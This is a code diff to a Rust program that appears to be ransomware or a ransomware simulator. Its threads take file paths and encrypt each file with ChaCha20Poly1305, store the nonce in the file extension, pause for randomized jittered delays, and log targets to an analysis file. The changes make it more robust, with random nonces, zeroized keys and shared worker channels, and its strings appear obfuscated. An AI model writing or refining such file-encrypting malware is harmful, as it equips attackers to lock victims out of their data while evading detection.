@@ -1,4 +1,3 @@
-use crossbeam_channel::{Receiver, Sender};
 use hex::{FromHex, encode};
 use log::{debug, error, info, warn};
 use purecrypto::{cipher::ChaCha20Poly1305, rsa::BoxedRsaPublicKey};
@@ -11,33 +10,37 @@ use std::{
     io::{Error, Read, Write},
     path::PathBuf,
     sync::{
-        Arc, LazyLock,
-        atomic::{AtomicU64, Ordering},
+        Arc, LazyLock, Mutex,
+        mpsc::{Receiver, SyncSender},
     },
     thread, time,
 };
+use zeroize::Zeroizing;
 
 use crate::config;
 
-pub fn nonce_from_counter(counter: u64) -> [u8; 12] {
+pub fn generate_nonce() -> [u8; 12] {
     let mut nonce = [0u8; 12];
-    nonce[0..8].copy_from_slice(&counter.to_le_bytes());
+    rand::rng().fill(&mut nonce);
     nonce
 }
 
 static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
 
 pub fn encrypt(
-    receiver: Receiver<Arc<PathBuf>>,
-    sender: Sender<Arc<PathBuf>>,
-    key: Arc<[u8; 32]>,
-    counter: Arc<AtomicU64>,
+    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
+    sender: SyncSender<Arc<PathBuf>>,
+    key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting encryption crypto thread");
     thread::spawn(move || {
         loop {
-            let file_path = match receiver.recv() {
+            let received = receiver
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .recv();
+            let file_path = match received {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -51,7 +54,6 @@ pub fn encrypt(
             let result = std::panic::catch_unwind({
                 let file_path = file_path.clone();
                 let key = Arc::clone(&key);
-                let counter = Arc::clone(&counter);
                 let aad = Arc::clone(&aad);
                 let sender = sender.clone();
                 let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
@@ -59,11 +61,8 @@ pub fn encrypt(
                 move || {
                     info!("Encrypting file: {file_path:?}");
 
-                    let nonce = counter.fetch_add(1, Ordering::Relaxed);
-                    debug!("Nonce value after increment: {nonce:?}");
-
-                    let full_nonce_bytes = nonce_from_counter(nonce);
-                    debug!("Nonce value after padding: {full_nonce_bytes:?}");
+                    let full_nonce_bytes = generate_nonce();
+                    debug!("Generated random nonce: {full_nonce_bytes:?}");
 
                     let nonce_file_extension = format!(
                         "{}.{}",
@@ -109,13 +108,17 @@ pub fn encrypt(
                         }
                     }
 
-                    let wait_time = config::WAIT_TIME;
-                    let jitter_time = config::JITTER_TIME;
+                    let wait_time = u64::from(config::WAIT_TIME);
+                    let jitter_time = u64::from(config::JITTER_TIME);
                     if wait_time > 0 {
-                        let time = wait_time - jitter_time + rng_cheap.random_range(0..jitter_time);
+                        let jitter = jitter_time.min(wait_time);
+                        let time = if jitter > 0 {
+                            (wait_time - jitter) + rng_cheap.random_range(0..=jitter * 2)
+                        } else {
+                            wait_time
+                        };
                         debug!("Sleeping {time} seconds before next encryption");
-                        let time_duration = time::Duration::from_secs(u64::from(time));
-                        thread::sleep(time_duration);
+                        thread::sleep(time::Duration::from_secs(time));
                         debug!("Sleeping complete");
                     }
                 }
@@ -128,7 +131,10 @@ pub fn encrypt(
     })
 }
 
-pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
+pub fn record(
+    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
+    path: Arc<PathBuf>,
+) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
         let mut analysis_file = match OpenOptions::new()
@@ -144,7 +150,11 @@ pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::J
         };
 
         loop {
-            let file_path = match receiver.recv() {
+            let received = receiver
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .recv();
+            let file_path = match received {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -165,13 +175,17 @@ pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::J
 }
 
 pub fn decrypt(
-    receiver: Receiver<Arc<PathBuf>>,
-    key: Arc<[u8; 32]>,
+    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
+    key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         loop {
-            let file_path = match receiver.recv() {
+            let received = receiver
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .recv();
+            let file_path = match received {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
